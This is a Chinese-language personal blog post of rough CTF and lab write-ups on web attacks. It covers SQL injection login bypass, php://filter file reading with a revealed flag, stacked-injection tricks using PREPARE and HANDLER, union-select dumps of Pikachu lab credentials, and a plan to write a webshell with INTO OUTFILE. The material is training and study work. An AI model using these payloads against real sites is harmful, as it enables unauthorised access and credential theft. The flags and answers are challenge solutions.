@@ -1,0 +1,1585 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>web-未整理解题过程 | 24kmagic</title><meta name="author" content="qyt"><meta name="copyright" content="qyt"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="web-未整理解题过程sql注入1.账号密码登陆题目 方法一：万能账户密码判断闭合方式后就可以套公式啦 sql语句：1.原本：随便输入 1SELECT*FROM table_name WHERE username&#x3D;&#x27; a&#x27; and password&#x3D;&#x27;123&#x27;;    2.我们要做的： 1SELECT*FROM table_name WHERE userna">
+<meta property="og:type" content="article">
+<meta property="og:title" content="web-未整理解题过程">
+<meta property="og:url" content="https://2829750658t-svg.github.io/posts/2198140d.html">
+<meta property="og:site_name" content="24kmagic">
+<meta property="og:description" content="web-未整理解题过程sql注入1.账号密码登陆题目 方法一：万能账户密码判断闭合方式后就可以套公式啦 sql语句：1.原本：随便输入 1SELECT*FROM table_name WHERE username&#x3D;&#x27; a&#x27; and password&#x3D;&#x27;123&#x27;;    2.我们要做的： 1SELECT*FROM table_name WHERE userna">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://2829750658t-svg.github.io/img/butterfly-icon.png">
+<meta property="article:published_time" content="2026-01-21T11:39:43.000Z">
+<meta property="article:modified_time" content="2026-01-28T06:52:10.084Z">
+<meta property="article:author" content="qyt">
+<meta property="article:tag" content="web-未整理">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://2829750658t-svg.github.io/img/butterfly-icon.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "web-未整理解题过程",
+  "url": "https://2829750658t-svg.github.io/posts/2198140d.html",
+  "image": "https://2829750658t-svg.github.io/img/butterfly-icon.png",
+  "datePublished": "2026-01-21T11:39:43.000Z",
+  "dateModified": "2026-01-28T06:52:10.084Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "qyt",
+      "url": "https://2829750658t-svg.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/images/favicon.png"><link rel="canonical" href="https://2829750658t-svg.github.io/posts/2198140d.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.3"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":500,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'web-未整理解题过程',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="google-site-verification" content="xcoxCJdnrLSrFpybmYmk6WSRqz-H1rnZB7BKSjdkWD0" /><meta name="google-site-verification" content="H8Bhbw_EXOKyVq27SUdcn_avXaVqBOWzs2lPJV_HSVw" /><meta name="generator" content="Hexo 8.1.1"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">29</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">25</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">15</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/images/bj2.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">24kmagic</span></a><a class="nav-page-title" href="/"><span class="site-name">web-未整理解题过程</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">web-未整理解题过程</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-01-21T11:39:43.000Z" title="发表于 2026-01-21 19:39:43">2026-01-21</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-01-28T06:52:10.084Z" title="更新于 2026-01-28 14:52:10">2026-01-28</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf%E9%A2%98%E8%A7%A3/">ctf题解</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf%E9%A2%98%E8%A7%A3/web/">web</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="web-未整理解题过程"><a href="#web-未整理解题过程" class="headerlink" title="web-未整理解题过程"></a>web-未整理解题过程</h2><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>1.账号密码登陆题目</p>
+<p>方法一：万能账户密码<br>判断闭合方式后就可以套公式啦</p>
+<p>sql语句：<a href=""></a><br>1.原本：随便输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT*FROM table_name WHERE username=&#x27; a&#x27; and password=&#x27;123&#x27;;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>2.我们要做的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT*FROM table_name WHERE username=&#x27;      a&#x27; or ture #     &#x27; and password=&#x27;123&#x27;;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>当输入   a’ or ture #<br>整句话会被解析成：    </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx一堆被闭合的垃圾话xx       or ture </span><br></pre></td></tr></table></figure>
+
+<p>（一个成立即为真）</p>
+<p>where条件为真，执行最前面select语句</p>
+<p>那么就通关了</p>
+<p>这里有一个问题：为什么账号和密码只要一个填了万能公式就可以成功？<br>你先想一下：账号填了这个万能公式，密码填的明明是错的为什么可以对？</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT*FROM table_name WHERE username=&#x27;      a&#x27;        or ture          #     &#x27; and password=&#x27;123&#x27;;</span><br></pre></td></tr></table></figure>
+
+
+<p>即使密码是错的，但是被注释掉了<br>只要整个语句的值是真的就欧克</p>
+<p>所以当我们密码用万能时，语句变成：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT*FROM table_name WHERE username=&#x27; a&#x27; and password=&#x27; a&#x27;     or true    	  #&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>你说你输什么用户能让这句话错吗？nonononono</p>
+<h2 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h2><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>这道题设计代审，我们会到某一个步骤发现php代码，然后按照提示我们需要用伪协议读取flag.php，</p>
+<p>但是，千万注意：</p>
+<p>因为关键的代码</p>
+<p>这些都是漏洞，而想要利用这些漏洞构造payload必须要在这个网页上面</p>
+<p>因此我们需要在此网页后直接跟payload：</p>
+<p>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;你想要看的文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+
+<!DOCTYPE html>
+<html>
+
+
+<p>这里得到的码在经过转码就能看到:</p>
+<pre><code>&lt;head&gt;
+    &lt;meta charset=&quot;utf-8&quot;&gt;
+    &lt;title&gt;FLAG&lt;/title&gt;
+&lt;/head&gt;
+
+&lt;body style=&quot;background-color:black;&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;
+    
+    &lt;h1 style=&quot;font-family:verdana;color:red;text-align:center;&quot;&gt;啊哈！你找到我了！可是你看不到我QAQ~~~&lt;/h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;
+    
+    &lt;p style=&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;&gt;
+        &lt;?php
+            echo &quot;我就在这里&quot;;
+            $flag = &#39;flag{76a1cef7-2036-42cf-ab49-d9fc9bcba947}&#39;;
+            $secret = &#39;jiAng_Luyuan_w4nts_a_g1rIfri3nd&#39;
+        ?&gt;
+    &lt;/p&gt;
+&lt;/body&gt;
+</code></pre>
+</html>
+
+
+
+
+
+<h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><h3 id="1-1"><a href="#1-1" class="headerlink" title="1"></a>1</h3><p>随便注，那就sql注入</p>
+<p>输入万能</p>
+<p>发现字符型注入</p>
+<p>发现数组，没啥用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(1) &quot;1&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(7) &quot;hahahah&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(1) &quot;2&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(12) &quot;miaomiaomiao&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(6) &quot;114514&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(2) &quot;ys&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id=""><a href="#" class="headerlink" title=""></a></h3><ol>
+<li><p>order by，没结果。果断使用堆叠注入</p>
+</li>
+<li><p>selcet发现被过滤</p>
+</li>
+<li><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;show databases;#</span><br></pre></td></tr></table></figure></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(11) &quot;ctftraining&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(18) &quot;information_schema&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(5) &quot;mysql&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(18) &quot;performance_schema&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(9) &quot;supersqli&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(4) &quot;test&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<ol start="4">
+<li><p>1’;show tables;#</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(16) &quot;1919810931114514&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(5) &quot;words&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+</li>
+<li><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;; show columns from `1919810931114514`;#</span><br></pre></td></tr></table></figure></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">array(6) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(4) &quot;flag&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(12) &quot;varchar(100)&quot;</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]=&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>6.1 </p>
+<p>预编译：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;PREPARE hacker from concat(&#x27;s&#x27;,&#x27;elect&#x27;, &#x27; * from `1919810931114514` &#x27;);EXECUTE  hacker;#</span><br></pre></td></tr></table></figure>
+
+<p>6.2</p>
+<p>handle</p>
+<p>HANDLER 功能类似<code>SELECT * FROM 表名</code>，在不能用select的时候使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;HANDLER `1919810931114514` OPEN;HANDLER `1919810931114514` READ FIRST;HANDLER `1919810931114514` CLOSE;#</span><br><span class="line"></span><br><span class="line">1&#x27;;</span><br><span class="line">HANDLER `1919810931114514` OPEN;</span><br><span class="line">HANDLER `1919810931114514` READ FIRST;</span><br><span class="line">HANDLER `1919810931114514` CLOSE;#</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HANDLER `<span class="number">1919810931114514</span>` <span class="keyword">OPEN</span>;          <span class="comment">-- 打开数据表</span></span><br><span class="line">HANDLER `<span class="number">1919810931114514</span>` READ <span class="keyword">FIRST</span>;     <span class="comment">-- 读取表的第一行数据</span></span><br><span class="line">HANDLER `<span class="number">1919810931114514</span>` <span class="keyword">CLOSE</span>;          <span class="comment">-- 关闭数据表</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<h2 id="Pikachu靶场-SQL注入-数字型注入（post）题解"><a href="#Pikachu靶场-SQL注入-数字型注入（post）题解" class="headerlink" title="Pikachu靶场-SQL注入-数字型注入（post）题解"></a>Pikachu靶场-SQL注入-数字型注入（post）题解</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`select * from 表 where 字段=输入内容`（无引号，直接接数字）</span><br></pre></td></tr></table></figure>
+
+
+
+<p>1.抓包，发现有id&#x3D;3&amp;submit&#x3D;%E6%9F%A5%E8%AF%A2，这个就是注入点</p>
+<p>2.输入id&#x3D;3 and 1&#x3D;1 –&amp;submit&#x3D;%E6%9F%A5%E8%AF%A2 没报错</p>
+<p>  输入id&#x3D;3 and 1&#x3D;2 –&amp;submit&#x3D;%E6%9F%A5%E8%AF%A2 报错</p>
+<p>由此，我们知道报错页面和没报错页面长啥样</p>
+<p>3.寻找有多少个字段显示（1-3都输入后，发现3报错）</p>
+<p>  输入id&#x3D;3 order by 1 –&amp;submit&#x3D;%E6%9F%A5%E8%AF%A2</p>
+<p>因此只有两个字段</p>
+<p>4.select显示</p>
+<p>  输入id&#x3D;3 union select 11，22 –</p>
+<p>  输出：</p>
+<p>hello,kobe <br />your email is: <a href="mailto:&#107;&#x6f;&#x62;&#101;&#x40;&#112;&#105;&#x6b;&#97;&#x63;&#x68;&#117;&#46;&#x63;&#x6f;&#x6d;">kobe@pikachu.com</a></p><p class='notice'>hello,11 <br />your email is: 22</p>
+<p>5.找数据库名</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select <span class="title function_">version</span>() ,<span class="title function_">database</span>() --</span><br></pre></td></tr></table></figure>
+
+<p>数据库名：pikachu</p>
+<p>6.找表名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select table_name,22 from information_schema.tables where table_schema=database() -- </span><br></pre></td></tr></table></figure>
+
+<p>表名：users</p>
+<p>7.找列名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select column_name,22 from information_schema.columns where table_schema=&#x27;pikachu&#x27; and table_name=&#x27;users&#x27; -- bbq</span><br></pre></td></tr></table></figure>
+
+<p>列名：user，password</p>
+<p>8.找数据</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select username,password <span class="keyword">from</span> users -- bbq</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h2 id="Pikachu靶场-SQL注入-字符型注入（get）题解"><a href="#Pikachu靶场-SQL注入-字符型注入（get）题解" class="headerlink" title="Pikachu靶场-SQL注入-字符型注入（get）题解"></a>Pikachu靶场-SQL注入-字符型注入（get）题解</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from 表 where 字段=&#x27;输入内容&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>1.输入万能密码</p>
+<p>得到：</p>
+<p>your uid:1<br>your email is: <a href="mailto:&#118;&#105;&#110;&#99;&#x65;&#x40;&#112;&#x69;&#107;&#x61;&#x63;&#104;&#x75;&#46;&#99;&#x6f;&#109;">vince@pikachu.com</a></p>
+<p>your uid:2<br>your email is: <a href="mailto:&#97;&#x6c;&#x6c;&#x65;&#110;&#64;&#x70;&#105;&#x6b;&#x61;&#x63;&#104;&#117;&#x2e;&#99;&#111;&#109;">allen@pikachu.com</a></p>
+<p>your uid:3<br>your email is: <a href="mailto:&#107;&#x6f;&#98;&#101;&#x40;&#x70;&#105;&#107;&#x61;&#x63;&#104;&#117;&#46;&#x63;&#x6f;&#109;">kobe@pikachu.com</a></p>
+<p>your uid:4<br>your email is: <a href="mailto:&#103;&#114;&#x61;&#x64;&#121;&#64;&#x70;&#105;&#107;&#x61;&#99;&#x68;&#117;&#46;&#99;&#x6f;&#x6d;">grady@pikachu.com</a></p>
+<p>your uid:5<br>your email is: <a href="mailto:&#107;&#x65;&#x76;&#x69;&#110;&#64;&#112;&#105;&#107;&#x61;&#99;&#104;&#117;&#46;&#99;&#x6f;&#x6d;">kevin@pikachu.com</a></p>
+<p>your uid:6<br>your email is: <a href="mailto:&#x6c;&#117;&#x63;&#121;&#x40;&#x70;&#x69;&#x6b;&#x61;&#x63;&#104;&#117;&#46;&#x63;&#x6f;&#x6d;">lucy@pikachu.com</a></p>
+<p>your uid:7<br>your email is: <a href="mailto:&#x6c;&#105;&#108;&#x69;&#64;&#112;&#105;&#x6b;&#97;&#99;&#104;&#117;&#46;&#99;&#x6f;&#x6d;">lili@pikachu.com</a></p>
+<p>所以，我们能找到账号和密码，并且让它展示出来像这样就好了</p>
+<p>your uid:账号<br>your email is: 密码</p>
+<p>2.寻找账号密码，就需要知道他们在哪儿</p>
+<p>查数据库：pikachu</p>
+<p>查表：有个users表</p>
+<p>查列名：找到passwd和username两个列名</p>
+<p>显示账号密码：select password，username from users #</p>
+<p>3.得到答案</p>
+<h2 id="Pikachu靶场-SQL注入-搜索型注入-题解"><a href="#Pikachu靶场-SQL注入-搜索型注入-题解" class="headerlink" title="Pikachu靶场-SQL注入-搜索型注入 题解"></a>Pikachu靶场-SQL注入-搜索型注入 题解</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from 表 where 字段 like &#x27;%输入内容%&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>找字段：</p>
+<p>a%’ order by 2 #</p>
+<h2 id="Pikachu靶场-SQL注入-xx型注入-题解"><a href="#Pikachu靶场-SQL注入-xx型注入-题解" class="headerlink" title="Pikachu靶场-SQL注入-xx型注入 题解"></a>Pikachu靶场-SQL注入-xx型注入 题解</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from 表 where 字段 like (&#x27;输入内容&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>找字段：</p>
+<p>a’) order by 2 #</p>
+<p><code>outfile</code></p>
+<p>1.SELECT … INTO OUTFILE ‘文件路径’  &#x2F;&#x2F;可以把搜索到的数据导出到文本文件上</p>
+<p>2.secure_file_priv 的三种结果含义是：<br> NULL 表示不能导出文件<br> 空值表示可以导出到任意路径<br> 指定路径表示只能导出到该路径</p>
+<p>3.@@secure_file_priv 用来判断你能不能写文件、能不能写 shell<br>4.@@datadir 用来查看数据库真实存放在哪个磁盘目录</p>
+<h2 id="sqli-7-题解"><a href="#sqli-7-题解" class="headerlink" title="sqli-7 题解"></a>sqli-7 题解</h2><p>1.经过一系列探索注入尝试发现输入结构:（（’’）），且字段数为3</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?id=1&#x27;)) union select 1,2,3--+</span><br></pre></td></tr></table></figure>
+
+<p>返回：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You are in.... Use outfile......</span><br></pre></td></tr></table></figure>
+
+<p>这道题目没有回显，不能用联合注入</p>
+<p>2.决定使用outfile进行木马注入</p>
+<p>观察源代码</p>
+<p>发现：输出错误信息这一行被注释掉了，所以不能用报错注入</p>
